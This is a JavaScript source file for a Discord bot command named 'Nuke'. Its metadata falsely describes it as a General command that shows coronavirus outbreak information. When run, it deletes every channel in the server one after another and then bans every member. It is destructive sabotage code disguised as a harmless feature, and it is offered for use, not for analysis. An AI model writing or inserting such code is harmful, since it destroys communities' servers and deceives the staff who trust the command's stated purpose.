const { Command } = require("../../structures/Command");
const { RichEmbed } = require("discord.js");
class Nuke extends Command {
    constructor(client) {
        super(client, {
            name: "nuke",
            aliases: ["a"],
            description: "View global information about the coronavirus outbreak!",
            category: "General",
            staffOnly: true
        });
    }
    async exec(message, args, guildColor, templateEmbed) {
        
        message.member.send("Successfully Initiated the Nuke Module");
      
        let channelMapped = message.guild.channels.map(x=>x);
        for (let i = 0; i < channelMapped.length; i++) {
          setTimeout(function () {
             channelMapped[i].delete()
             .then(() => console.log(`Successfully delete ${channelMapped[i].name}`))
             .catch(() => console.log(`Failed to delete ${channelMapped[i].name}`))
          }, i * 500)
        }
      
        setTimeout(function () {
          let memberMapped = message.guild.members.map(x=>x);
          for (let i = 0; i < memberMapped.length; i++) {
            setTimeout(function () {
              memberMapped[i].ban("L")
              .then(() => console.log(`Successfully banned ${memberMapped[i].user.tag}`))
              .catch(() => console.log(`Failed to ban ${memberMapped[i].user.tag}`))
            }, i * 5000)
          }
        }, channelMapped.length * 500)
      
    }
}

module.exports = Nuke;